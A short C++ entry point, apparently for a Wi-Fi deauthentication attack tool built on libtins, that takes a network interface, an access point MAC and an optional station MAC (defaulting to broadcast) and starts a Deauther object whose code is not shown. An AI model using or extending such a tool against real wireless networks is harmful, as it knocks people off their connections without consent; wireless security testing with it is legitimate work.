#include <iostream>
#include <tins/tins.h>
#include "deauther.h"

using namespace std;
using namespace Tins;

int main(int argc,char* argv[])
{
    Deauther *de;
    try{
        if(argc == 3){
            de = new Deauther(argv[1],argv[2],"FF:FF:FF:FF:FF:FF");
        }
        else if(argc == 4){
            de = new Deauther(argv[1],argv[2],argv[3]);
        }
        else{
            cout << argv[0] << " <interce name> <ap mac> [<station mac>]" << endl;
            return 0;
        }
    } catch(exception e)
    {
       cout << e.what() << endl;
       return -1;
    }
    de->Start();
    return 0;
}
